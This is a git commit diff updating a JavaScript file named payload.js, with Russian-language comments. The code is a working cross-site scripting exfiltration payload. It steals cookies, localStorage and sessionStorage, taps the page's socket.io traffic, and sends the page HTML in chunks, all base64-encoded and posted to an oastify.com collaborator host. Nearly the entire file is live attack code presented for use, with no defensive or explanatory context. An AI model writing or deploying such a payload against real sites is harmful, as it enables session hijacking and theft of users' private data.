7a5dc81db727a16e2c0722a61a56cead6dbec81c
Elyor <109429042+Elliy0r@users.noreply.github.com>
2025-09-04 16:00:19 +0500

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,16 +1,33 @@
 (function(){
   try {
+    // Слить базовые данные
     let data = {
       cookie: document.cookie,
       localStorage: JSON.stringify(localStorage),
-      sessionStorage: JSON.stringify(sessionStorage),
-      html: document.documentElement.innerHTML
+      sessionStorage: JSON.stringify(sessionStorage)
     };
+    fetch("https://mmc08w6hfx7im3o9ah4u42ekibo2cs0h.oastify.com/?base=" + btoa(JSON.stringify(data)));
 
-    fetch("https://mmc08w6hfx7im3o9ah4u42ekibo2cs0h.oastify.com/?d=" + btoa(JSON.stringify(data)))
-      .catch(()=>{});
+    // Подключиться к socket.io (он уже есть на странице)
+    if (typeof io !== "undefined") {
+      var s = io(window.location.origin, { path: "/socket.io" });
+      s.onAny((event, ...args) => {
+        fetch("https://mmc08w6hfx7im3o9ah4u42ekibo2cs0h.oastify.com/?evt=" 
+              + encodeURIComponent(event) 
+              + "&d=" + btoa(JSON.stringify(args)))
+          .catch(()=>{});
+      });
+    }
+
+    // Слить HTML по кускам (если большой)
+    let html = document.documentElement.innerHTML;
+    for (let i = 0; i < html.length; i+=1500) {
+      fetch("https://mmc08w6hfx7im3o9ah4u42ekibo2cs0h.oastify.com/?html=" 
+            + btoa(html.slice(i, i+1500)))
+        .catch(()=>{});
+    }
   } catch(e) {
-    fetch("https://mmc08w6hfx7im3o9ah4u42ekibo2cs0h.oastify.com/?err=" + encodeURIComponent(e.toString()))
-      .catch(()=>{});
+    fetch("https://mmc08w6hfx7im3o9ah4u42ekibo2cs0h.oastify.com/?err=" 
+          + encodeURIComponent(e.toString()));
   }
 })();
